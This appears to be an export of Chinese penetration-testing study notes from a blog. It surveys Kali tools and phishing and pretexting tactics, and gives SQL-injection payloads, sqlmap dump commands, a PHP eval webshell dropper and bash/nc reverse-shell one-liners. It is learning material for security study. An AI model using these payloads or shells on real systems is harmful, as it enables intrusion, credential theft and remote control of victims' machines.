服务/版本识别\n- 操作系统检测\n- 网络路由跟踪\n- Nmap脚本引擎\n\n\n\n\n\n## 网络扫描\n\n### Amap\n\nAmap程序可以监测在指定端口上运行的应用程序信息。Amap向目标端口发送检测数据，在收到目标响应之后，将响应信息与数据库中结果进行匹配，并显示出匹配的应用程序。\n\n\n\n\n\n## 收集服务漏洞\n\n### DirBuster:查看目录结构\n\n目录和文件信息收集工具（Crawling Tool）DirBuster是多线程Java应用程序，它以暴力破解的方式检测出隐藏于网络和应用程序的文件和目录，并以此找出攻击因子（factor）。另外，它还可以设置暴力破解的起始位置，其起始位置可以是顶端目录，也可以是特定目录的子目录。\n\n\n### Nessus\n\nNessus是安全漏洞自动收集工具，它可同时远程或在主机上进行测试，扫描各种开发端口的服务器漏洞，并编写报告，报告中包括了CVE漏洞基准的漏洞说明和应对方案，导出问题时可做参考。\n\n### Openvas\n\nOpenvas是一款封装了多种安全工具和安全服务的软件，是一个强大的漏洞管理平台。它采用了客户端/服务器的框架。其客户端测试目标主机网络漏洞的一系列操作，都是通过服务器端程序实现的。他的设计兼备模块化和稳定性的特点，支持并行安全测试，且兼容多种操作系统。\n\n### Nikto\n\nNikto是一款开源网页服务器，能够扫描应用程序漏洞。在应用程序漏洞自动化扫描工具中，这款还是非常不错的。\n\n\n\n\n\n## 诊断CMS服务漏洞\n\n### Joomscan\n\njomscan是基于签名的扫描器，它以开源的CMS服务joomal的Sql注入、命令执行、XSS对象，试试joomla目录搜索和漏洞检测。Joomla适合电子商务、网上购物、论坛等各类网站，是使用较为普遍的CMS。网站使用的是众所周知的漏洞——数据库。joomscan具有构成要素、插件、组件、外观等4个基本扩展名。\n\n\n### WPScan\n\nWPScan是WordPress Scan的缩写，它是使用php语言开发而成的公开博客服务。最近介绍WordPress的书很多，这已经证明它在韩国国内也是用户群众比较广泛的代表性开源平台。\n\n\n\n### WhatWeb\n\nWhatWeb是Web系统识别工具，它可以识别CMS、博客平台、统计和分析数据包、JavaScript库、网络服务器和嵌入式装备等网络技术。WhatWeb中包含可以识别各种技术的1000多个插件。另外，它还会查看版本编号、邮箱地址、账户ID、网络框架组件、SQL错误等。\n\n\n\n\n\n## 诊断数据库漏洞\n\n### SQLmap\n\nsqlmap是一款开源的渗透测试工具，它可以自动搜索SQL注入漏洞，并自动化攻击数据库服务器。这款功能超强的搜索检测引擎可以从数据库的Fingerprinting（获取信息）向数据库输出数据、访问文件系统、访问频段外区域以执行OS上的命令等。为实施最理想的渗透测试提供了多种便利功能和诸多选项开关。\n\n\n### sqlsus\n\nSqlsus是基于Perl编写的开源MySQL注入接管（takeover）工具。Sqlsus可通过命令行界面进行数据库结构搜素、数据库复制、sql查询插入、从网络服务器下载文件、网站抓取等等操作。另外sqlsus还提供了MySQL控制台功能，而且能够优质高效、最大限度地发挥MySQL功能。\n\n\n\n## 诊断认证通信\n\n### SSLScan:查看通信是否已经加密\n\nSSLScan能查看SSL服务的使用状态，如正在使用，则能便捷地获取相关内容。SSLScan向SSL服务发送查询语句，分析答复后发送给用户。向服务器传递重要数据时，通信必须是加密的，因此，诊断网络应用程序时必须判断是否实际实施SSL通信。\n\n### digicert:查看是否已使用SSL认证证书\n\ndigicert服务并不是安装在Kali linux中的工具，而是提供SSL认证的服务。通过访问网站查看SSL认证书安装状态以及结束日期等信息。其速度快而准确，可在不定期检测时使用。\n\n\n\n# 深化攻击工具\n\n### Metasploit\n\nMsf（Metasploit Framework）开源工具是提供攻击代码、有效负载、编码器、侦查工具、安全测试等等的一种平台架构。MSF最初版本不过是攻击代码的集合而已，而当前版本已具有大范围信息收集、攻击等相关安全工具的设计和开发能力。\n\n\n### **Exploit-DB**\n\n**[Exploit-DB](https://www.exploit-db.com/)**其中包含了近期的漏洞信息，是一个庞大的漏洞信息库。这里面包含了远程代码执行、Web 应用程序漏洞、本地提权等漏洞信息.\n\n\n\n## 服务器端工具\n\n### Metasploit\n\nMetasploit框架是进行服务器端攻击时一种最流行的功能工具，它也被认为是对渗透测试人员最有利的工具之一。介绍Metasploit的使用的部分在我的Metasploit系列学习中有详细的介绍，我在此处就不再过多的讲解了。\n\n### W3af\n\nw3af是Web Application Attack and Audit Framework（Web应用攻击和安全审计框架）的缩写。它是一个开源的Web应用安全扫描器和漏洞利用工具。\n\n### Skipfish\n\nSkipfish是一款Web应用安全侦查工具。Skipfish会利用递归爬虫和基于字典的探针生成一副交互式网站地图。最终生成的地图会在通过安全检查后输出。\n\n### ProxyStrike\n\nProxystrike是一个Web应用代理，用来浏览应用时找出漏洞。它的运行机制跟代理类似，默认监听端口是8008端口，也就是说，你要对浏览器进行设置，使其运行时经过ProxyStrike。这样它才能在你的浏览目标网站时在后台分析所有参数。代理功能非常适合用来识别、拦截和修改请求的内容。\n\n\n\n### Vega\n\nvega是一个安全测试工具，用来爬取一个网站，并分析页面内容来找到链接和表单参数。\n\n### OWASP ZAP\n\nOWASP ZAP也称为Zaproxy，是一个专门为Web应用的安全测试而设计的拦截代理。\n\n### WebSploit\n\nWebSploit是一个用来扫描和分析远程系统以找到漏洞的开源项目\n\n- **服务器漏洞利用**\n\n- **利用电子邮件系统的漏洞**\n- **暴力破解攻击**\n- **破解密码**\n- **中间人攻击**\n\n\n\n## 客户端攻击\n\n### 社会工程\n\n### 获取和破解用户密码\n\n黑客破解密码的方式有：\n\n- 猜测：通常使用收集到的与目标有关的信息进行人工猜测\n- 字典攻击：使用自动化攻击，利用字典中所有可能的单词进行尝试\n- 暴力破解：使用所有可能的字符组合来破解\n- 混合模式：混合使用字典攻击和暴力破解\n\n\n\n## Web攻击\n\n### 浏览器漏洞利用框架：BeEF\n\nBeef是一个基于浏览器的漏洞利用包，它会“勾住”一个或多个浏览器作为发起攻击的滩头堡。攻击者可以通过让用户访问一个定制的URL来勾住用户，用户看到的依然是典型的web页面，而攻击者已经访问了用户的会话Beef绕过了网络安全部署和基于主机系统的反病毒程序，它瞄准的是常见的浏览器中找到的漏洞，比如IE和Firefox浏览器。\n\n\n\n### FoxyProxy（fireFox插件）\n\nFoxyProxy是一款FierFox扩展，它允许你轻松的管理、修改、启用或禁用Firefox上的代理设置。你可以存Fierfox扩展库中下载FoxyProxy。\n\n### Burp代理\n\nBurp代理是一款拦截HTTP和HTTPS浏览的工具，它允许渗透测试人员检查某一个应用、它的漏洞以及客户端和Web服务器之间的双向数据流。Burp代理非常流行，因为它不止能用来检查数据流，还可以用来篡改数据。\n\n### OWASP ZAP\n\n### Fimap\n\nFimap是一款python工具，用于自动查找、准备、审计、利用和用谷歌搜索Web应用中的**本地和远程文件包含Bug**\n\n### DNSChef\n\nDNSChef是一款为渗透测试人员和恶意软件分析人员准备的DNS代理。DNS代理也被称作“伪造DNS”，是一款用于应用网络流量分析以及其他场景的工具。\n\n### Siege\n\nSiege是一款为Web开发人员设计的HTTP/HTTPS压力测试工具，用来测量高压情况下他们代码的性能。Siege提供了多线程HTTP负载测试和基准测试功能，他会根据可配置的兵法和模范用户的数据来对Web服务器进行测试。Siege有回归、英特网仿真和暴力等工作方式。\n\n\n\n## 身份认证攻击\n\n### 攻击会话管理\n\n### 点击劫持\n\n### 劫持Web会话的CooKie\n\n### 中间人攻击\n\n**dsniff和arpspoof**\ndsniff是一组密码嗅探和网络数据分析工具，用于解析不同的应用协议和提取相关信息。arpspoof用于帮助攻击者向本地网络发送伪造的地址解析协议（ARP）消息。这样做的目的就是要将攻击者的MAC地址和其他主机的IP地址关联起来，从而将发往该IP地址的网络数据都发送给攻击值。\n\n一个人进行中间人攻击的方法是将Arpspoof和dsniff用在系统间。\n\n第一步就是找出受害者的IP地址和网络的默认网关。找出IP地址之后，你需要告诉受害者你真的是另一个系统或者默认网关。举个例子，如果受害者A的IP地址是192.168.11.4，默认网关的地址为192.168.11.1，攻击者的地址为192.168.11.145，你应该使用arpspoof命令将你那个145的ip地址设置的看起来像是受害者的和默认网关的。\n\n**Ettercap**\n\nEttercap是一个用于基于中间人方式的攻击的免费的开源综合工具套件。\n\nEttercap可用于计算机网络协议分析和安全审计，它的功能有嗅探活动的链接、内容过滤、以及对多种协议的主动和被动解析的支持。Ettercap通过将攻击者的网卡设置为昏则模式以及对受害者的机器进行ARP污染来工作。\n\n\n\n## 社会工程学攻击\n\n### 攻击过程\n\n社会工程学工程师通常会采用这些方法来有效获取目标的有关信息和访问权限：\n\n**（1）情报收集：**多种技术都可以用于找到最容易攻破的渗透测试目标。例如，我们可以采用高级搜索工具收集被测试公司员工的Email地址；通过社交网络收集被测单位员工的个人信息；识别被测单位组织使用的第三方软件包；参与他们的经营活动、社交活动和参加会议等等。以这些方提供的情报，能够准确的退测出社会工程学意义上的“线人”。\n\n**（2）识别漏洞：**一旦选定了关键线人，接下来就开始与对方建立信任关系和友谊。这样就可以在不伤害、不惊动目标的情况下，截获被测单位的机密信息。保持行动的隐蔽性和保密性，对于整个过程来说至关重要。另外，也可以调查被侧单位是否使用了旧版软件，继而通过恶意的E-mail或 Web内容，利用软件漏洞感染当事人的计算机。\n\n**（3）规划攻击:**  你可以对目标采取直接了当的攻击方式，也可以利用电子辅助技术被动攻击目标。以这些挖掘出来的情报入口着手，我们恶意轻松的拟定攻击路径和攻击方法。例如：被测单位的客户服务代表Bob和我们的关系很好，他还信任我们；他就恒友可能在计算机上执行我们发送的E-mail附件，这种攻击不需要高级管理人员的任何事前授权。\n\n**（4）执行攻击：**社会工程学攻击的最后一步是执行攻击计划。此时，我们应该保持足够的信心和耐心，主动监控和评估工作的成果。完成这一步之后，社会工程师掌握了充分的信息，甚至可以范围被测单位的内部系统，这些成果足以让他们进一步地渗透被测试的单位。在成功执行攻击计划之后，社会工程学的攻击就可宣告结束。\n\n### 攻击方法\n\n**（1）冒名顶替**\n\n攻击人员常常假装成他人以获得对方的信任。例如，在获取目标人员的银行信息方面，只要目标人员是哟E-mail，我们就可以进行钓鱼攻击。这种攻击属于近乎完美的攻击方案。当决定使用钓鱼攻击之后，攻击人员要大量的收集牧宝人员用过的E-mail地址，然后伪造出于原银行解密一样的网页界面，以诱骗目标人员。\n\n完成了一上准备之后，攻击人员会草拟并发送一份正式行文的E-mail（例如：银行账户更新通知）。这些E-mail看上去就像真正的银行发出来的邮件。要去目标人员访问某网址更新账户信息。不过，邮件提到的网址将把目标人员提交的信息转发给攻击人员。攻击人员事先掌握了特定的Web技术，他们使用多种先进的工具（例如SSLstrip）就可以通过自动化手段轻松的又掉地到达预定的任务。\n\n**（2）投桃报李**\n\n通过利益交换的方式达成双方各自利益的行为，成为投桃报李。这类攻击需要长期业务合作达成的非正式关系。利用公司之间的信任关系，可以轻松的获取特定信息的目标人员。\n\n**（3）狐假虎威**\n\n冒充目标单位业务负责人的身份从而干预正常业务的做法就是狐假虎威。有些人认为，这种攻击方式属于冒名顶替的一种特例。人们会本能的出于下意识的接收权威或者高级管理人员的知识，这个时候他们会无视自己否定性的直觉。这种天性使我们容易在特定的威胁面前毫无抵抗力。\n\n**（4）啖以重利**\n\n人们常常说“机不可失”，他们特别关注所谓机不可失的宝贵机会。这些想法都是人性贪婪的一面写照。啖以重利的方法李永利人们个球谋利机会的贪婪心理。\n\n**（5）社会关系**\n\n作为人，我们需要某种形式的社会关系，以分享思想、感情、想法。社会关系最容易受攻击的部分是“性”。多数情况下，异性总是吸引。由于这种强烈的感情和信任的错觉，人们可能在不经意间向对手透露信息。很多线人的社交门户网站都提供了见面和聊天的服务，以促进用户间的社交交际。\n\n\n\n### Social Engineering Toolkit(SET)\n\nSET是一款先进的多功能的社会工程学计算机辅助工具集。可以行之有效的用客户端应用程序的漏洞获取目标的信息（例如E-mail）.SET可以实现多种非常有效且使用的攻击方法。其中，人们最常用的方法有：用恶意附件对目标进行E-mail钓鱼攻击、Java Applet攻击、基于浏览器的漏洞攻击、收集网站认证信息、建立感染的便携媒体、邮件群发等攻击。它是实现这些攻击方法的合成攻击平台。充分利用这个程序的极具说服力的技术，可对人的因素进行深入测试。\n\n\n\n## 权限提升\n\n- 利用本地漏洞\n- 利用目标系统上的配置缺陷。例如，如何home目录可被其他用户访问，那么攻击人员就可以使用目录里的SSH私有密钥访问其他主机。\n- 利用目标系统的弱密码\n- 嗅探网络流量以捕获他人的用户密码\n- 伪造网络数据包\n\n**利用本地漏洞**\n\n**密码攻击**\n\n**社会工程学**\n\n\n\n## 操作系统后门\n\n### Cymothoa\n\nCymothoa是一款可以将ShellCode注入到现有进程（插入进程）的后门工具。借助这种注入手段，它能够把ShellCode伪装成常规程序。将ShellCode注入到其他进程，还有另外一个优势就是：即使目标系统的安全防护工具能够讲师可执行程序的完整性，只要它不检查内存，那么它就不能发现后门程序（插入进程）的进程。\n\n\n\n### Intersect\n\nIntersect是一款适合在漏洞利用以后使用的能够自动完成多种后期任务的程序。他能够自动收集密码文件、赋值SSH密钥、收集网络信息，并能识别杀毒软件和防火墙程序。\n\n### Meterpreter\n\n著名的Metasploit Meterpreter程序自带一个后门程序“metsvc”,它可以让你随时获取Meterpreter的shell\n\n\n\n## 隧道工具\n\n**隧道**\n\n在计算机领域里，隧道是指使用某个网络协议封装另外一种网络协议的技术手段。在渗透测试中，使用隧道技术主要是为了让目标胸膛呢的防护机制无法发挥作用。多数情况下，目标系统的防火墙会组织内部系统访问外网网络，只放行DNS\\HTTP\\HTTPS这类常见的网络协议。在这种情况下，如果要在目标系统的内网使用外网的其他网络协议，就需要构建HTTP协议的隧道。这样，防火墙就会放行隧道封装的数据。\n\n\n\n### dns2tcp\n\ndns2tcp是一种把TCP数据包伪装成DNS协议数据包的隧道封装工具。它适用于目标主机只能发送DNS请求的网络环境。当它在特定端口受理链接请求时，它会将数据封装为DNS协议格式，在发送到指定主机的指定端口的dns2tcp服务端程序。\n\n### ncat\n\nncat是一款集发送、接收、转发、加密数据等多种功能于一身的网络工具。ncat是著名的Netcat程序的改进版。它的功能有：\n\n- 它可以用作Web服务程序和其他TCP/IP服务器端程序简易TCP/UDP/SCTP/SSL客户端；\n- 它可以用作简单的TCP、UDP、SCTP、SSL服务器端程序。\n- 它可以转发或代理TCP、UDP、SCTP流量\n- 它可以用作执行系统指令的网络网关\n- 它可使用SSL技术加密通信数据\n- 它可以使用IPv4或IPV6技术进行网络传输\n- 它可用作连接代理，通过第三个中介服务器使用两个或多个客户端互联代理。\n  \n  \n\n### proxychains\n\nproxychains程序可以强制TCP客户端程序通过指定的代理服务器（或代理链）发起TCP链接。自从3.1版本开始，它支持SOCKS4代理、SOCKET5代理和基于CONNECT模式的HTTP代理服务器。\n\n### ptunnel\n\nptunnel是一款使用ICMP ping（请求和回复）封装TCP链接的隧道工具。即使被测主机无法向Internet发送任何TCP和UDP的数据，只要它可以向取Internet发起ping命令，那么这款工具就可以帮助它穿越防火墙。ptunnel可以脱离TCP和UDP链接访问E-mail、上网或者进行其他网络活动。\n\n\n\n## Web后门\n\n### WeBaCoo\n\nWeBaCoo（Web Backdoor Cookie）是一款隐蔽的脚本类Web后门工具。借助HTTP协议，它可以在客户端和服务器端实现执行代码的网页终端。\n\n### Weevely\n\nWeevely是一款具有高隐蔽性的针对PHP平台的WEBShell。它实现了SSH风格的终端界面，并有大量自动化的模块。测试人员可用它来执行系统命令、远程管理和渗透后期的自动渗透界面。\n\n### PHP Meterpreter\n\nMetasploit有一个名为PHP Meterpreter的payload。这个模块可以创建具有Meterpreter功能的PHP webShell。利用目标的漏洞（诸如常见的注入、文件上传漏洞）之后，再把它的shell传到目标主机即可。\n\n\n\n## 以网络为测试目标的渗透测试报告（样文）\n\n- 法律声明\n- 渗透测试协议\n- 简介\n- 项目目标\n- 假定和限制\n- 漏洞和影响\n- 执行摘要\n- 风险矩阵\n- 测试方法\n- 安全威胁\n- 改进建议\n- 漏洞映射\n- 利用方法\n- 合规性评估\n- 变更管理\n- 最佳实践\n- 附录","tags":["安全"],"categories":["笔记"]},{"title":"2020年1月14日学习笔记","url":"%2F2020%2F01%2F14%2F20200114%2F","content":"\n## 路由收集\n\n### traceroute\n\n通过traceroute我们可以知道信息从你的计算机到互联网另外一端的主机是走什么路径。当然每次数据包由某一同一的出发点（source）到达某一同一的目的地（destination）走的路径可能会不一样，但基本上来说大部分时候所走的路由是相同的。Linux中，我们称之为traceroute，在MS Windows中我们称之为tracert。\n\n\n### tctrace \n\ntctrace也是一个路由信息分析工具，这个程序通过向目标主机发送TCP/SYN数据包来获取相应的信息。\n\n\n\n## DNS信息收集\n\n### Whois \n\nWhois简单来说就是一个用来查询域名是否已经被注册，以及注册域名的纤细信息的数据库（如域名所有人、域名注册商、域名注册日期、过期日期等）.\n\n\n\n### Dig\n\ndig（域信息搜索器）命令是一个用于询问 DNS 域名服务器的灵活的工具。它执行 DNS 搜索，显示从受请求的域名服务器返回的答复。多数 DNS 管理员利用 dig 作为 DNS 问题的故障诊断，因为它灵活性好、易用、输出清晰。\n\n\n\n### Host\n\nHost指令提供一个简单的DNS解析的功能。正常地使用名称到IP的解析，当指令没有任何参数和选项的时候，它将输出简单的带命令行参数和选项的概要。\n\n\n\n### Fierce\n\n在一个安全的环境中，暴力破解DNS的方式是一种获取不连续IP地址空间主机的有效手段。fierce工具可以满足这样的需求，而且已经预装在Kali Linux中。fierce是RSnake创立的快速有效地DNS暴力破解工具。fierce工具首先根据域名的IP地址，查询相关的域名服务器，然后利用字典进行攻击\n\n\n### dnsenum\n\ndnsenum的目的是尽一切可能收集一个域的信息，它能够通过Google或者字典文件猜测可能存在的域名，以及对一个网段进行反查询。\n\n它可以查询网站主机的主机地址信息、域名服务器、MX record（函数交换记录），在域名服务器上执行axfr请求，并通过Google脚本得到扩展域名信息，提取子域名并且查询，计算C类地址并执行Whois查询，执行反向查询，把地址段写入文件。\n\n\n### lbd\n\nlbd(Load balancing detector,负载平衡检测器)检测给定的域是否使用DNS/HTTP负载均衡（通过Server和DateHTTP响应头字段和服务器应答之间的差异）\n\n\n\n\n\n## IDS/IPS信息收集\n\n### IDS/IPS简介\n\nIDS（Intrusion Detection System）即入侵检测系统。是一种对网络传输进行及时监控，在发现可疑传输时发出警报或者采取主动反应措施的网络安全设备。它与其他网络安全设备的不同之处便在于——IDS是一种积极主动的安全防护技术。\n\nIPS（Intrusion Prevention System）即入侵防御系统。IPS位于防火墙和网络设备之间。这样，如过检测到攻击，IPS会在这种攻击扩散到网络的其他地方之前阻止这个恶意的通信。\n\n\n### IDS/IPS二者的区别\n\n（1）IDS注重的是网络安全状况的监管。IPS注重的是对入侵行为的控制。\n\n（2）IDS需要部署在网络内部的中心点，需要能够观察到所有网络数据。IPS需要部署在网络的边界。\n\n（3）IDS的核心价值在于通过对全网信息的分析，了解信息系统的安全状况，进而指导信息系统安全建设目标以及安全策略的确立和调整，而IPS系统的核心价值在于安全策略的实施————————对黑客行为的阻击。\n\n（4）IDS需要部署在网络内部，监控范围可以覆盖整个子网，包括来自外部的数据以及内部终端之间传输的数据，IPS则必须部署在网络边界，抵御来自外部的入侵，对内部攻击行为无能为力。\n\n\n**WAFw00f**是Python脚本，用于检测网络服务器是否处于网络应用的防火墙（WAF ，Web application firewall）保护状态。不仅可以发展测试战略，而且能够开发绕过应用网络防火墙的高级技术。\n\n\n\n\n\n## 存活主机识别\n\n### ping\n\n在检测主机是否在线的工具中，ping可能是最著名的程序了。该工具向目标主机发送ICMP协议的echo request数据包。如果目标主机在线且允许受理ping请求，那么目标主机间回复ICMP echo reply数据包。\n\n### arping\n\narping是在局域网中使用ARP(Address Resolution Protocol)请求判断目标主机是否在线的工具。您可以用IP地址或MAC地址作为它的测试目标。\n\n因为arping程序工作于OSI模型中的第二层，ARP协议的数据包无法通过路由器和网关，所以它只能检测本地局域网中的主机。\n\n\n### fping\n\n与ping程序相比，fping可以同时向多个主机发送ping（ICMP echo）请求。您可以在命令行中指定多个目标主机，也可以在某个文件里指定需要被测试的主机。\n\n默认模式下，fping程序通过目标主机的回复来判断该主机是否在线。如果目标主机发送了回应，该主机将会被标记为alive（在线）；如果主机在一段时间内（超时或者超过尝试次数）没有进行响应，该主机则会被标记为UNreachable（不可访问）。默认情况下，fping将尝试向每个目标发送三次ICMP echo数据包。\n\n\n### hping3\n\nhping是用于生成和解析TCP/IP协议数据包的开源工具。创作者是Salvatore Sanfilippo。目前最新版是hping3，支持使用tcl脚本自动化地调用其API。hping是安全审计、防火墙测试等工作的标配工具。hping优势在于能够定制数据包的各个部分，因此用户可以灵活对目标机进行细致地探测。\n\n**hping3的主要用途：**\n\n- 测试防火墙规则\n- 测试入侵检测系统IDS\n- 测试TCP/IP模式的安全漏洞\n  \n\n### nping\n\nnping允许用户发送多种协议（TCP、UDP、ICMP和ARP协议）的数据包。您可以调整协议头中的字段，例如可以设置TCP和UDP的源端口和目的端口。nping和其他类似工具的区别，如nping程序和ping程序之间的区别相似，nping可以探测多个主机的多个端口。\n\n此外，他可以像ping程序一样发送ICMP echo请求。nping还可以用于对网络进行压力测试，ARP中毒、Dos攻击等。\n\n\n### nbtscan\n\n如果是在内网渗透测试中审计Windows 系统，你需要首先获取主机的NetBIOS信息。最常用的工具就是nbtscan.\n\n这个工具可以将相应的主机IP地址、NetBIOS计算机名、可用服务、登录用户名和MAC地址整理为报告。如需要采用NetBIOS协议访问目标主机NetBIOS服务（例如网络共享），就需要掌握目标主机的NetBIOS名称。这个工具将会产生大量的网络流量，而且很可能被目标主机记录在日志里。\n","tags":["笔记"],"categories":["笔记"]},{"title":"2020年1月12日学习笔记","url":"%2F2020%2F01%2F12%2F20200112%2F","content":"\n\n## MYSQL注入\n\n### Extravtvalue报错注入\n\n```sql\n\nid=1 and extractvalue(1, concat(0x7e, (select user()),0x7e)) \n```\n\n\n\n### updatexml报错注入\n\n```sql\nid=1 and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)\n```\n\n\n\n### 基于时间的注入\n\n\n\n#### **Sleep函数**\n\n在MYSQL中有一个函数：sleep（duration）,这个函数的意识是在duration参数给定的秒数之后运行语句，如下SQL语句：\n\n```sql\nselect  * from  users where id=1 and sleep(3);    /* 3秒之后执行SQL语句*/\n```\n\n判读注入漏洞存在与否\n\n**注入流程**\n\n思路：\n\n（1）查询当前用户，并获取字符串长度\n\n（2）截取字符串第一个字符，并且转换为asicc码\n\n（3）将第一个字符的ASCII与ASCII码表对比，如果对比成功将延迟3秒。\n\n（4）继续步骤2、3，直至字符串截取完毕。\n\n\n\n## SQL盲注\n\n（1）布尔盲注：布尔很明显有True和Flase,也就是说它会根据攻击者的注入信息返回True或者False,也就没有了之前的报错信息。\n\n（2）时间盲注：界面返回值只有一种True，无论输入任何值，返回情况都会按照正常来处理。加入特定的时间函数，通过查看WEB页面的返回时间差来判断注入的语句是否正确。\n\n（3）报错盲注：根据返回的显示错误信息构造SQL语句来进行的注入，称为报错盲注。\n\n**盲注中用到的函数**\n\n```\nLength（）                  函数 返回字符串的长度\nSubstr（）                  截取字符串\nAscii（）                   返回字符的ascii码\nsleep(n)                   将程序挂起一段时间 n为n秒\nif(expr1,expr2,expr3)      判断语句 如果第一个语句正确就执行第二个语句，如果错误执行第三个语句\n```\n\n#### 布尔SQL盲注\n\n**相关函数：**\n\n**（1）left(a,b)**\n\nleft(database(),1) >'s'     \n\n函数说明：\n\ndatabase()显示数据库名称，left(a,b)从左侧截取a的前b位\n\n**（2）Substr()**\n\nascii(substr((select table_name information_schema.tables where tables_schema=database()limit 0,1),1,1))=101 --+ \n\n函数说明：\n\nsubstr(a,b,c)从b位置开始，截取字符串a的c长度。 \nAscii()将某个字符转换为ascii值\n\n**（3）ord()、mid(）**        \n\n\nORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20)FROM security.users ORDER BY id LIMIT 0,1),1,1))>98%23  \n\n函数说明：\n\nmid(a,b,c)从位置b开始，截取a字符串的c位\n\nOrd()函数同ascii()，将字符转为ascii值\n\n**（4）regexp())正则注入**\n\n用法介绍：\n\nselect user() regexp '^[a-z]';\n\n函数说明：\n\n正则表达式的用法，user()结果为root，regexp为匹配root的正则表达式。\n匹配第二位：\n\nselect user() regexp '^ro'\n\n当正确的时候显示结果为1，不正确的时候显示结果为0.\n\n**（5）Like匹配注入**\n\n和正则注入类似，mysql在匹配的时候可以使用like进行匹配\n\nselect user() like 'ro%'\n\n#### 时间SQL盲注\n\n相关函数：\n\n**（1）if语句+sleep()函数**\n\n```\nIf(ascii(substr(database(),1,1))>115,0,sleep(5))%23 \n```\n\n\n\n<u>说明：if判断语句，条件为假时，执行sleep</u>\n\n**（2）benchmark（）函数**\n\n```\nUNION SELECT IF(SUBSTRING(current,1,1)=CHAR(119),BENCHMARK(5000000,ENCODE('MSG','by 5\n```\n\n\n\n#### 报错的SQL盲注\n\n***构造payload让信息通过错误提示回显出来***\n\n相关函数：\n\n*floor()、extravtvalue()、updatexml()*\n\n\n\n\n## 社工\n\nREG007: 查看手机或邮箱注册了哪些网站\n\n\n\n\n\n## SQL注入截取字符串常用函数\n（1）mid()函数\n（2）substr()函数\n（3）Left()函数\n\n\n\n## SQLmap使用\n\n**(1）在终端输入命令：**\n\n“Sqlmap.py –u 目标URL” ，-u扫描注入点扫描目标主机，检测出的信息准确\n\n**(2）爆出数据库：**\n\nSqlmap.py –u http://ctf5.shiyanbar.com/web/index_3.php?id=1–-dbs\n\n**(3）爆表：**\n\nSqlmap.py –u http://ctf5.shiyanbar.com/web/index_3.php?id=1–D web1 –-tables\n\n**(4)  爆字段：**\n\nSqlmap.py –u http://ctf5.shiyanbar.com/web/index_3.php?id=1–D web1 –T flag –-columns\n\n**(5)  显示字段值：**\n\nSqlmap.py –u http://ctf5.shiyanbar.com/web/index_3.php?id=1 –D web1 –T flag –C flag --dump\n\n\n\n## 文件上传漏洞\n\n### IIS解析漏洞\n\n当文件为“.asp;1.jpg”时，分号后面的不被解析\n\n### IIS 7.0/7.5/Nginx<8.3畸形解析漏洞\n\n在默认Fast-CGI开启的状况下，黑客上传一个名字为wooyun.jpg，内容为\n\n<?php fputs(fopen(‘shell.php’,’w’),’<?php eval($_POST[cmd]?)’);?>\n\n的文件，然后访问wooyun.jpg/.php,在这个目录下就会生成一句话木马shell.php\n\n### Nginx<8.03空字节代码执行漏洞\n\n**影响版本：0.5，0.6,0.7<=0.7.65,0.8<=0.8.37**\n\nNginx在图片中嵌入PHP代码然后通过访问 xxx.php%00.jpg 来执行其中的代码\n\n**Apache解析漏洞**\n\n在Apache1.x与Apache2.x中存在解析漏洞，不管文件的后缀是什么，只要是.php.*结尾，就会被Apache服务器解析成PHP文件,问题是Apache如果在mime.types文件里面没有定义的扩展名比如x1.x2.x3的情况下，最后一个x3的没有定义，那么就会将其解析成倒数第二个的x2的定义的扩展名类型。所以xxx.php.rar或者xxx.php.111这些默认没有在mime.types文件定义的都会解析成PHP的.","tags":["笔记"],"categories":["笔记"]},{"title":"2020年1月11日学习笔记","url":"%2F2020%2F01%2F11%2F20200111%2F","content":"\n# 2020/01/11\n\n## nc反弹cmdshell\n\nwindow命令主命令为:ncat\n\nlinux主命令为:nc\n\n以window为例\n\n 本地监听：ncat -lvvp 8080 \n\n 往公网反弹cmdshell： \n\n  ncat -e cmd.exe [ip] 8080 \n\n\n\n## bash反弹shell\n\n主要命令: bash -i >& /dev/tcp/192.168.174.128/9090 0>&1 \n\nnc监听端口\n\nncat -lvvp 9090\n\n然后bash反弹，其中ip地址为公网ip\n\nbash -i >& /dev/tcp/[ip]/9090 0>&1\n\n\n\n## nc反弹shell\n\nnc监听端口\n\nncat -lvvp 9090\n\nLinux机反弹:\n\nnc -e /bin/bash [ip] 9090 \n\n\n\n## 渗透测试分类\n\n **渗透测试按测试方法与视角可以分为以下三类：** \n\n1） 黑盒测试\n\n定义：渗透测试人员除了知道被测试的目标之外，其余与目标相关的信息一无所知。\n\n特点：这种类型的渗透测试属于外部渗透测试。在前期需要对目标进行大量的信息收集，耗时较长。但是这种类型的渗透测试更有利于挖掘出系统潜在的漏洞、以及脆弱环节、薄弱点等。\n\n（2） 白盒测试\n\n定义：渗透测试人员可以通过正常渠道向被测试单位取得各种资料，包括网络拓扑结构图、员工资料甚至网站程序的代码片段，也可以和单位其他员工进行面对面沟通。\n\n特点：这种类型的渗透测试在前期已经对目标系统有了一个初步的了解。这类测试的地点可以分为“从组织内部”与“从组织外部”两种大环境。在这种测试下可以充分发挥“社会工程学的力量”，对企业内部雇员的越权操作进行测试。\n\n（3） 灰盒测试\n\n定义：灰盒测试介于白盒测试与黑盒测试之间\n\n特点：属于较为隐秘的测试。在测试当中，被测试单位只有少数人知晓测试的存在，因此能够较好的检验单位中的信息安全事件监控、响应等是否到位。\n\n\n渗透测试按照测试目标，可以分为以下四类：\n\n（1） 操作系统渗透\n\nWindows、Linux、Solaris、AIX、SCO等\n\n（2） 数据库系统渗透\n\nMySQL 、Oracle、MSSQL、sybase、informix\n\n（3） 应用系统渗透\n\n由ASP、JSP、PHP等组成的web应用（包括移动应用产品）\n\n（4） 网络设备渗透\n\n 防火墙、入侵检测系统等\n\n\n## 渗透测试流程\n\n**(1) 明确渗透测试目标和界限**\n\n**(2) 信息收集**\n\n \t*基础信息获取* \n\n​\t *WEB扫描信息获取* \n\n**(3) 威胁建模制定方案**\n\n**(4) 前期渗透测试**\n\n​\t  根据制定的渗透测试方案开始渗透测试 \n\n**(5) 后期渗透测试**\n\n​\t 在前期渗透测试的基础上扩大影响范围、提高权限、建立维持访问、清理痕迹 \n\n**(6) 写报告**\n\n\n\n## 信息安全三要素\n\n**机密性：**要求保护数据内容不被泄漏，加密是实现机密性要求的常用手段。\n\n**完整性：**要求保护的数据内容是完整的、没有被篡改的。常见的保证一致性的技术手段是数字签名。\n\n**可用性：**要求保护的资源是“随需而得”。\n\n\n\n## 如何实施安全评估\n\n*互联网安全的核心问题是数据安全的问题*\n\n### 资产等级划分\n\n 